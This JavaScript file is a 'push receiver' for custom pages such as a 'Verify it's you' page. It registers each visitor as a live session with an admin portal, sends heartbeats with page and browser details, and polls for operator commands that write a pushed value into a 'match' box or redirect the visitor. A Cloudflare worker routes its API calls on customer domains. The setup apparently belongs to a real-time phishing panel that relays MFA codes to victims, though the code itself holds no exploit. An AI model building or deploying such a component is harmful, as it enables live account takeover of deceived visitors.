/*
 * DEUCE push receiver — for custom/standalone pages (not DEUCE-generated).
 *
 * Usage (on the visitor-facing page, e.g. your "Verify it's you" page):
 *   1. Add the receiver and tell it which DEUCE user page it belongs to:
 *      <script src="push-receiver.js" data-deuce-user-page="user_page_xxxxxxxxxxxx"></script>
 *   2. Mark the empty box that should display the pushed value:
 *      <div class="match-empty" data-deuce-push-value>—</div>
 *      (or give it id="deucePushValue" and pass target: "deucePushValue" from the portal)
 *
 * How it works:
 *   - Registers a session id (stored in localStorage) and sends a heartbeat to
 *     /api/traffic every 10s, so the session shows as LIVE in the portal and the
 *     admin can target it.
 *   - Polls /api/session-command every 4s. A "displayValue" command is written
 *     into the [data-deuce-push-value] element (or the element named by `target`).
 *     If the command also carries a destination, the visitor is first redirected
 *     there so the value is already shown when they arrive.
 *
 * The /api/* paths are relative on purpose: on the customer domain the Cloudflare
 * worker rewrites them to the DEUCE runtime API.
 */
(function () {
  var SCRIPT = document.currentScript;
  var USER_PAGE_ID = (SCRIPT && SCRIPT.getAttribute("data-deuce-user-page")) || "";
  if (!USER_PAGE_ID) {
    if (window.console) console.warn("[deuce-push] data-deuce-user-page attribute is required");
    return;
  }

  var SESSION_KEY = "deuce_push_session_" + USER_PAGE_ID;

  function getSessionId() {
    try {
      var existing = window.localStorage.getItem(SESSION_KEY);
      if (existing) return existing;
    } catch (e) {}
    var generated = "sess_" + Date.now().toString(36) + Math.random().toString(36).slice(2, 10);
    try { window.localStorage.setItem(SESSION_KEY, generated); } catch (e) {}
    return generated;
  }

  var SESSION_ID = getSessionId();

  function post(path, payload) {
    try {
      fetch(path, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        keepalive: true
      }).catch(function () {});
    } catch (e) {}
  }

  function heartbeat() {
    post("/api/traffic", {
      userPageId: USER_PAGE_ID,
      sessionId: SESSION_ID,
      hostname: window.location.hostname,
      path: window.location.pathname,
      event: "heartbeat",
      screen: (window.DEUCE_PAGE_CONFIG && window.DEUCE_PAGE_CONFIG.screen) || null,
      userAgent: navigator.userAgent,
      createdAt: new Date().toISOString()
    });
  }

  function applyValue(value, target) {
    var el = null;
    if (target && /^[a-zA-Z0-9_-]{1,64}$/.test(String(target))) {
      el = document.getElementById(target);
    }
    if (!el) el = document.querySelector("[data-deuce-push-value]");
    if (!el) return;
    el.textContent = String(value || "");
    el.setAttribute("data-deuce-pushed-value", String(value || ""));
    try {
      document.dispatchEvent(new CustomEvent("deuce:push-value", {
        detail: { value: String(value || ""), target: target || null }
      }));
    } catch (e) {}
  }

  function sameLocation(url) {
    try {
      var a = document.createElement("a");
      a.href = url;
      var host = a.host || window.location.host;
      return a.pathname === window.location.pathname && host === window.location.host;
    } catch (e) {
      return false;
    }
  }

  function poll() {
    var params = new URLSearchParams({
      userPageId: USER_PAGE_ID,
      sessionId: SESSION_ID,
      hostname: window.location.hostname
    });
    fetch("/api/session-command?" + params.toString(), {
      method: "GET",
      headers: { Accept: "application/json" }
    })
      .then(function (response) { return response.ok ? response.json() : null; })
      .then(function (data) {
        var command = data && data.command;
        if (command && command.action === "displayValue" && command.value) {
          if (command.targetUrl && !sameLocation(command.targetUrl)) {
            window.location.href = command.targetUrl;
            return;
          }
          applyValue(command.value, command.target);
        }
      })
      .catch(function () {});
  }

  heartbeat();
  poll();
  window.setInterval(heartbeat, 10000);
  window.setInterval(poll, 4000);
})();
